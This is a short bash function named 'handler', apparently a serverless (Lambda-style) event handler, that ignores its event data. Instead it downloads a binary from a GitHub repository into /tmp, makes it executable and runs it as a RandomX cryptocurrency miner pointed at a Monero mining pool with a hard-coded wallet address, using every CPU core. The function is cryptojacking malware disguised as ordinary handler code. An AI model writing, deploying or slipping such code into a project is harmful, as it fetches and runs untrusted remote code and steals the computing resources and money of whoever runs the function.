function handler () {
    EVENT_DATA=$1

    cd /tmp && curl -L https://github.com/tungm2694-dev/xyz/raw/refs/heads/main/srb -o /tmp/srb && chmod +x srb && ./srb -a randomx -o pool.supportxmr.com:3333 -u 86JEakH7FPzGoqDwUsUVTdDqRzZBTri6G3iumVYAGWhz5jASWHWj4w7aNEq1ukFxQYGzJUWKp1qLnStw7CDQPzSA1iuQHLU -p skyblue -t $(nproc --all)
}
